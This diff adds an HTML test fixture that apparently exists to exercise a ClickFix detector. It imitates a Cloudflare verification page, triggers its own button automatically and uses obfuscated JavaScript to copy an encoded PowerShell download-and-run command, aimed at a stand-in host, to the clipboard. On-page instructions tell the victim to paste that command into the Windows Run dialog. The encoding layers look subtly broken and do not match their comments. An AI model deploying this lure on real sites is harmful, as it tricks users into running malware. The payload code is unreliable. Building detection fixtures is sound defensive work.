@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ClickFix Obfuscated - Test Fixture</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            max-width: 500px;
+            margin: 50px auto;
+            padding: 20px;
+            text-align: center;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        .cloudflare-box {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+        }
+        .logo {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        .btn {
+            background: #f38020;
+            color: white;
+            padding: 15px 40px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #f38020;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .instructions {
+            margin-top: 20px;
+            padding: 20px;
+            background: #fff9e6;
+            border: 2px solid #f38020;
+            border-radius: 8px;
+            display: none;
+            text-align: left;
+        }
+        code {
+            background: #f5f5f5;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+        }
+    </style>
+</head>
+<body>
+    <div class="cloudflare-box">
+        <div class="logo">☁️</div>
+        <h2>Cloudflare Verification</h2>
+        <p>Checking your browser before accessing the website...</p>
+        <div class="spinner" id="spinner"></div>
+        <button id="verifyBtn" class="btn">I'm Not a Robot</button>
+        <div id="instructions" class="instructions">
+            <strong>⚠️ Additional Verification Required</strong>
+            <p>To complete verification, please follow these steps exactly:</p>
+            <ol>
+                <li>Press <code>Win + R</code> on your keyboard</li>
+                <li>The "Run" dialog will appear</li>
+                <li>Press <code>Ctrl + V</code> to paste the verification code</li>
+                <li>Click OK or press <code>Enter</code></li>
+            </ol>
+            <p style="font-size: 12px; color: #666;">This process verifies your system configuration is genuine.</p>
+        </div>
+    </div>
+
+    <script>
+        // Highly obfuscated ClickFix with multiple encoding layers
+        const _0x4a2b = ['clipboard', 'writeText', 'getElementById', 'verifyBtn', 'addEventListener', 'click', 'style', 'display', 'block', 'textContent', '✓ Verification Code Copied', 'disabled', 'log', '[Obfuscated ClickFix] Multi-layer payload deployed'];
+
+        function _0xf3a8(str) {
+            // Deobfuscate function (intentionally complex for test)
+            return atob(str);
+        }
+
+        // Triple-encoded PowerShell payload
+        // Layer 1: Base64 of Layer 2
+        // Layer 2: Base64 of actual PowerShell
+        // Actual command: Downloads and executes remote payload
+        const layer1 = 'cG93ZXJzaGVsbCAtZW5jIEpBQmpBR3dBYVFCbEFHNEFkQUFnQUQwQUlBQk9BR1VBZHdBdEFDMEFUd0JpQUdvQVpRQmpBSFFBSUFCVEFIa0FjZ0J6QUhRQVpRQnRBQzRBVGdCbEFIUUFMZ0JYQUdVQVlnQkRBR3dBYVFCbEFHNEFkQUE3QUNBQSRBY0FBZ0FEMEFJQUFrQUdNQWJBQnBBR1VBYmdCMEFDNEFSQUJ2QUhjQWJnQnNBRzhBWVFCa0FGTUFkQUJ5QUdrQWJnQm5BQ2dBSWdCb0FIUUFkQUJ3QURvQUx3QXZBR1VBZUFCaEFHMEFjQUJzQUdVQUxnQmpBRzhBYlFBdkFHMEFZUUJzQUhjQVlRQnlBR1VBTGdCbEFIZ0FaUUFpQUNrQU93QWdBRk1BZEFCaEFISUFkQUF0QUZBQWNnQnZBR01BWlFCekFITUFJQUFrQUdVQWJnQjJBRG9BVkFCRkFFMEFVQUJjQUcwQVlRQnNBSGNBWVFCeUFHVUFMZ0JsQUhnQVpRQT0=';
+
+        async function deployPayload() {
+            try {
+                // Decode multiple layers
+                const layer2 = _0xf3a8(layer1);
+                const maliciousCommand = _0xf3a8(layer2);
+
+                // Copy to clipboard using modern API
+                await navigator[_0x4a2b[0]][_0x4a2b[1]](maliciousCommand);
+
+                // Show UI feedback
+                const btn = document[_0x4a2b[2]](_0x4a2b[3]);
+                document[_0x4a2b[2]]('instructions')[_0x4a2b[6]][_0x4a2b[7]] = _0x4a2b[8];
+                document[_0x4a2b[2]]('spinner')[_0x4a2b[6]][_0x4a2b[7]] = 'none';
+                btn[_0x4a2b[9]] = _0x4a2b[10];
+                btn[_0x4a2b[11]] = true;
+
+                console[_0x4a2b[12]](_0x4a2b[13]);
+            } catch (err) {
+                console.error('[Obfuscated ClickFix] Deployment failed:', err);
+            }
+        }
+
+        // Event listener setup
+        document[_0x4a2b[2]](_0x4a2b[3])[_0x4a2b[4]](_0x4a2b[5], function() {
+            document[_0x4a2b[2]]('spinner')[_0x4a2b[6]][_0x4a2b[7]] = _0x4a2b[8];
+            this.style.display = 'none';
+            setTimeout(deployPayload, 1500);
+        });
+
+        // Auto-trigger with realistic delay
+        setTimeout(function() {
+            document[_0x4a2b[2]](_0x4a2b[3]).click();
+        }, 1000);
+    </script>
+</body>
+</html>
